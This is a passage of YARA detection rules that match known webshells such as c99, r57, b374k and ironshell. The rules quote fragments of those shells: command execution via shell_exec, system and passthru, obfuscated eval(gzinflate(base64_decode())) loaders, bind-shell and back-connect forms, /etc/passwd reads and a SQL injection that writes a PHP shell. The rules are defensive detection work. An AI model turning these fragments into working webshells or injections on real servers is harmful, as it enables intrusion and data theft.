strings:
	$s0 = "r3v3ng4ns\\nDigite"
	$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
	$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
condition:
	1 of them
}
rule Php_Webshell_telnetd_pl
{
strings:
	$s0 = "0ldW0lf" fullword
	$s1 = "However you are lucky :P"
	$s2 = "I'm FuCKeD"
	$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
	$s4 = "atrix@irc.brasnet.org"
condition:
	1 of them
}
rule Php_Webshell_php_include_w_shell_php
{
strings:
	$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
	$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
condition:
	1 of them
}
rule Php_Webshell_Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php
{
strings:
	$s0 = "Safe0ver" fullword
	$s1 = "Script Gecisi Tamamlayamadi!"
	$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
condition:
	1 of them
}
rule Php_Webshell_shell_php_php
{
strings:
	$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
	$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
	$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
condition:
	1 of them
}
rule Php_Webshell_telnet_cgi
{
strings:
	$s1 = "W A R N I N G: Private Server"
	$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
	$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
condition:
	1 of them
}
rule Php_Webshell_ironshell_php
{
strings:
	$s0 = "www.ironwarez.info"
	$s1 = "$cookiename = \"wieeeee\";"
	$s2 = "~ Shell I"
	$s3 = "www.rootshell-team.info"
	$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
condition:
	1 of them
}
rule Php_Webshell_backdoorfr_php
{
strings:
	$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
	$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
condition:
	1 of them
}
rule Asp_Webshell_aspydrv_asp
{
strings:
	$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
	$s1 = "password"
	$s2 = "session(\"shagman\")="
condition:
	2 of them
}
rule Jsp_Webshell_cmdjsp_jsp
{
strings:
	$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
	$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
	$s2 = "cmdjsp.jsp"
	$s3 = "michaeldaw.org" fullword
condition:
	2 of them
}
rule Php_Webshell_h4ntu_shell__powered_by_tsoi_
{
strings:
	$s0 = "h4ntu shell"
	$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
condition:
	1 of them
}
rule Asp_Webshell_Ajan_asp
{
strings:
	$s1 = "c:\\downloaded.zip"
	$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
	$s3 = "http://www35.websamba.com/cybervurgun/"
condition:
	1 of them
}
rule Php_Webshell_PHANTASMA_php
{
strings:
	$s0 = ">[*] Safemode Mode Run</DIV>"
	$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
	$s2 = "[*] Spawning Shell"
	$s3 = "Cha0s"
condition:
	2 of them
}
rule Php_Webshell_MySQL_Web_Interface_Version_0_8_php
{
strings:
	$s0 = "SooMin Kim"
	$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
	$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
	$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
condition:
	2 of them
}
rule Php_Webshell_simple_cmd_html
{
strings:
	$s1 = "<title>G-Security Webshell</title>" fullword
	$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
	$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
	$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
condition:
	all of them
}
rule Php_Webshell_1_c2007_php_php_c100_php
{
strings:
	$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
	$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
condition:
	1 of them
}
rule Php_Webshell_nst_php_php_img_php_php_nstview_php_php
{
strings:
	$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
	$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
	$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
condition:
	1 of them
}
rule Php_Webshell_network_php_php_xinfo_php_php_nfm_php_php
{
strings:
	$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
	$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"
condition:
	all of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SpecialShell_99_php_php
{
strings:
	$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
	$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
condition:
	1 of them
}
rule Php_Webshell_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php
{
strings:
	$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
	$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"
condition:
	1 of them
}
rule Php_Webshell_c99shell_v1_0_php_php_c99php_SsEs_php_php_ctt_sh_php_php
{
strings:
	$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
	$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
	$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""
condition:
	2 of them
}
rule Php_Webshell_r577_php_php_spy_php_php_s_php_php
{
strings:
	$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
	$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
condition:
	1 of them
}
rule Php_Webshell_webshell_c99_generic
{
strings:
	$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
	$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
	$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
	$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"
condition:
	all of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php
{
strings:
	$s0 = "$sess_data[\"cut\"] = array(); c99_s"
	$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
condition:
	1 of them
}
rule Php_Webshell_w_php_php_wacking_php_php_SpecialShell_99_php_php
{
strings:
	$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
	$s2 = "c99sh_sqlquery"
condition:
	1 of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php
{
strings:
	$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
	$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"
condition:
	1 of them
}
rule Php_Webshell_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_spy_php_php_s_php_php
{
strings:
	$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
	$s1 = ".$arrow.\"</b>\",in('text','"
condition:
	2 of them
}
rule Php_Webshell_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php
{
strings:
	$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
	$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
	$s2 = "rst.void.ru"
condition:
	3 of them
}
rule Php_Webshell_r577_php_php_r57_Shell_php_php_spy_php_php_s_php_php
{
strings:
	$s0 = "echo ws(2).$lb.\" <a"
	$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
	$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"
condition:
	2 of them
}
rule Php_Webshell_wacking_php_php_1_SpecialShell_99_php_php_c100_php
{
strings:
	$s0 = "if(eregi(\"./shbd $por\",$scan))"
	$s1 = "$_POST['backconnectip']"
	$s2 = "$_POST['backcconnmsg']"
condition:
	1 of them
}
rule Php_Webshell_r577_php_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php
{
strings:
	$s1 = "if(rmdir($_POST['mk_name']))"
	$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
	$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
condition:
	2 of them
}
rule Php_Webshell_w_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php
{
strings:
	$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
	$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
	$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
condition:
	1 of them
}
rule Php_Webshell_multiple_php_webshells
{
strings:
	$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
	$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
	$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
condition:
	2 of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php
{
strings:
	$s0 = "<b>Dumped! Dump has been writed to "
	$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
	$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"
condition:
	1 of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php
{
strings:
	$s0 = "@ini_set(\"highlight" fullword
	$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
	$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
condition:
	2 of them
}
rule Php_Webshell_GFS_web_shell_ver_3_1_7___PRiV8_php_nshell_php_php_gfs_sh_php_php
{
strings:
	$s2 = "echo $uname.\"</font><br><b>\";" fullword
	$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
	$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
condition:
	2 of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_SpecialShell_99_php_php
{
strings:
	$s0 = "c99ftpbrutecheck"
	$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
	$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
	$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
condition:
	2 of them
}
rule Php_Webshell_w_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php
{
strings:
	$s0 = "$sqlquicklaunch[] = array(\""
	$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"
condition:
	all of them
}
rule Php_Webshell_antichat_php_php_Fatalshell_php_php_a_gedit_php_php
{
strings:
	$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
	$s1 = "if($action==\"phpeval\"){" fullword
	$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
	$s3 = "$dir=getcwd().\"/\";" fullword
condition:
	2 of them
}
rule Php_Webshell_c99shell_v1_0_php_php_c99php_SsEs_php_php
{
strings:
	$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
condition:
	1 of them
}
rule Php_Webshell_Crystal_php_nshell_php_php_load_shell_php_php
{
strings:
	$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
	$s1 = "$dires = $dires . $directory;" fullword
	$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
condition:
	2 of them
}
rule Php_Webshell_nst_php_php_cybershell_php_php_img_php_php_nstview_php_php
{
strings:
	$s0 = "@$rto=$_POST['rto'];" fullword
	$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
	$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
condition:
	2 of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_dC3_Security_Crew_Shell_PRiV_php_SpecialShell_99_php_php
{
strings:
	$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
	$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
condition:
	all of them
}
rule Php_Webshell_c99shell_v1_0_php_php_c99php_1_c2007_php_php_c100_php
{
strings:
	$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
condition:
	all of them
}
rule Php_Webshell_multiple_php_webshells_2
{
strings:
	$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
	$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
	$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
condition:
	all of them
}
rule Php_Webshell_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_1_SpecialShell_99_php_php
{
strings:
	$s0 = "if ($total === FALSE) {$total = 0;}" fullword
	$s1 = "$free_percent = round(100/($total/$free),2);" fullword
	$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
	$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
condition:
	2 of them
}
rule Php_Webshell_r577_php_php_r57_php_php_spy_php_php_s_php_php
{
strings:
	$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
	$s2 = "'eng_text30'=>'Cat file'," fullword
	$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
condition:
	1 of them
}
rule Php_Webshell_nixrem_php_php_c99shell_v1_0_php_php_c99php_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_php
{
strings:
	$s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
	$s1 = "$ret = posix_kill($pid,$sig);" fullword
	$s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
	$s3 = "$i = $nixpasswd;" fullword
condition:
	2 of them
}
rule Php_Webshell_DarkSecurityTeam_Webshell
{
strings:
	$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
condition:
	1 of them
}
rule Php_Webshell_PHP_Cloaked_Webshell_SuperFetchExec
{
strings:
	$s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"
condition:
	$s0
}
rule Php_Webshell_WebShell_RemExp_asp_php
{
strings:
	$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
	$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
	$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
	$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
	$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_dC3_Security_Crew_Shell_PRiV
{
strings:
	$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
	$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
	$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
	$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
	$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
	$s20 = "if (isset($_GET['rename_all'])) {" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_simattacker
{
strings:
	$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
	$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
	$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
	$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
	$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
	$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
	$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
	$s20 = "$Comments=$_POST['Comments'];" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_DTool_Pro
{
strings:
	$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
	$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
	$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
	$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
	$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
	$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
	$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
	$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_ironshell
{
strings:
	$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
	$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
	$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
	$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
	$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
	$s16 = "if($_POST['chars'] == \"9999\")" fullword
	$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
	$s18 = "print shell_exec($command);" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_indexer_asp_php
{
strings:
	$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
	$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
	$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
	$s4 = "<form action=\"?oku\" method=\"post\">" fullword
	$s7 = "var message=\"SaNaLTeRoR - " fullword
	$s8 = "nDexEr - Reader\"" fullword
condition:
	3 of them
}
rule Asp_Webshell_WebShell_toolaspshell
{
strings:
	$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
	$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
	$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_b374k_mini_shell_php_php
{
strings:
	$s0 = "@error_reporting(0);" fullword
	$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
	$s3 = "@set_time_limit(0); " fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_Sincap_1_0
{
strings:
	$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
	$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
	$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
	$s12 = "while (($ekinci=readdir ($sedat))){" fullword
	$s19 = "$deger2= \"$ich[$tampon4]\";" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_b374k_php
{
strings:
	$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
	$s6 = "// password (default is: b374k)"
	$s8 = "//******************************************************************************"
	$s9 = "// b374k 2.2" fullword
	$s10 = "eval(\"?>\".gzinflate(base64_decode("
condition:
	3 of them
}
rule Php_Webshell_WebShell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend
{
strings:
	$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
	$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
	$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
	$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
	$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
	$s19 = "$Comments=$_POST['Comments'];" fullword
	$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_h4ntu_shell__powered_by_tsoi_
{
strings:
	$s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
	$s13 = "$cmd = $_POST['cmd'];" fullword
	$s16 = "$uname = posix_uname( );" fullword
	$s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
	$s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
	$s20 = "ob_end_clean();" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_php_webshells_MyShell
{
strings:
	$s3 = "<title>MyShell error - Access Denied</title>" fullword
	$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
	$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
	$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
	$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
	$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
	$s19 = "#every command you excecute." fullword
	$s20 = "<form name=\"shell\" method=\"post\">" fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_php_webshells_pws
{
strings:
	$s6 = "if ($_POST['cmd']){" fullword
	$s7 = "$cmd = $_POST['cmd'];" fullword
	$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
	$s11 = "if (file_exists($uploaded)) {" fullword
	$s12 = "copy($uploaded, $dez);" fullword
	$s17 = "passthru($cmd);" fullword
condition:
	4 of them
}
rule Php_Webshell_WebShell_reader_asp_php
{
strings:
	$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
	$s12 = " HACKING " fullword
	$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
	$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
condition:
	3 of them
}
rule Php_Webshell_WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2
{
strings:
	$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
	$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
	$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
	$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
	$s15 = "if(empty($_GET['file'])){" fullword
	$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword
condition:
	3 of them
}
rule Php_Webshell_WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit
{
strings:
	$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
	$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
	$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
	$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
	$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_php_backdoor
{
strings:
	$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
	$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
	$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
	$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
	$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
condition:
	1 of them
}
rule Php_Webshell_WebShell_Worse_Linux_Shell
{
strings:
	$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
	$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
	$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
	$s8 = "$currentCMD = \"ls -la\";" fullword
	$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
	$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_php_webshells_pHpINJ
{
strings:
	$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
	$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
	$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
	$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
	$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
	$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
	$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_php_webshells_NGH
{
strings:
	$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
	$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
	$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
	$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
	$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
	$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
	$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_php_webshells_matamu
{
strings:
	$s2 = "$command .= ' -F';" fullword
	$s3 = "/* We try and match a cd command. */" fullword
	$s4 = "directory... Trust me - it works :-) */" fullword
	$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
	$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
	$s16 = "/* The last / in work_dir were the first charecter." fullword
condition:
	2 of them
}
rule Php_Webshell_WebShell_ru24_post_sh
{
strings:
	$s1 = "http://www.ru24-team.net" fullword
	$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
	$s6 = "Ru24PostWebShell"
	$s7 = "Writed by DreAmeRz" fullword
	$s9 = "$function=passthru; // system, exec, cmd" fullword
condition:
	1 of them
}
rule Php_Webshell_WebShell_hiddens_shell_v1
{
strings:
	$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
condition:
	all of them
}
rule Php_Webshell_WebShell_c99_madnet
{
strings:
	$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
	$s1 = "eval(gzinflate(base64_decode('"
	$s2 = "$pass = \"pass\";  //Pass" fullword
	$s3 = "$login = \"user\"; //Login" fullword
	$s4 = "             //Authentication" fullword
condition:
	all of them
}
rule Php_Webshell_WebShell_c99_locus7s
{
strings:
	$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
	$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
	$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
